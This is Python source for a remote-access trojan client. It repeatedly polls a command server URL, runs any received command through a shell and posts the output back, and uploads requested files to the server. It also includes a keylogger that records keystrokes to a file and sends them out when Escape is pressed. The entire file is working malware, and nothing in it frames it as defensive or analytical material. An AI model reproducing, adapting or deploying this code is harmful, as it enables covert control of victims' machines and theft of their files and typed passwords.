import subprocess
import time
import requests
import os
from config import App
from pynput.keyboard import Listener, Key

class rs_client:

    def create_connection(self):
        req = requests.get(App.config('URL'))
        cmd = req.text

        if 'stop' in cmd:
            quit()

        elif 'grab' in cmd:
            # Parses the part behind the hashtag (#) and stores it in the path variable.
            grab,path =  cmd.split('#')

            if os.path.exists(path):
                endpoint = App.config('URL') + '/store'
                # Dictionary with the file as value.
                files = {'file':open(path, 'rb')}
                r = requests.post(endpoint, files=files)

            else:
                post_response = requests.post(url=App.config('URL'), data='[!] Error: File not found.')

        elif 'logger' in cmd:
            # Enable keylogger.
            with Listener(on_press=self.on_press) as listener:
                listener.join()
            
        else:
            cmdPrompt = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

            # POST result or error.
            post_response = requests.post(url=App.config('URL'), data=cmdPrompt.stdout.read() )
            post_response = requests.post(url=App.config('URL'), data=cmdPrompt.stderr.read() ) 

            time.sleep(3)

    # Handles the key registering.
    def on_press(self, key):
        f = open(App.config('KEYLOGGERFILE'), 'a')  

        if hasattr(key, 'char'):  
            f.write(key.char)
        elif key == Key.space:  
            f.write(' ')
        elif key == Key.enter:  
            f.write('\n')
        elif key == Key.tab:  
            f.write('\t')
        elif key == Key.esc:
            endpoint = App.config('URL') + '/logger'
            files = {'file':open(App.config('KEYLOGGERFILE'), 'rb')}
            r = requests.post(endpoint,files=files)
            return False
        else:  
            f.write('[' + key.name + ']')
        f.close() 

if __name__ == '__main__':
    # Prevent connection from terminating after every request.
    while True:
        client = rs_client()
        rs_client.create_connection(client)

    
        
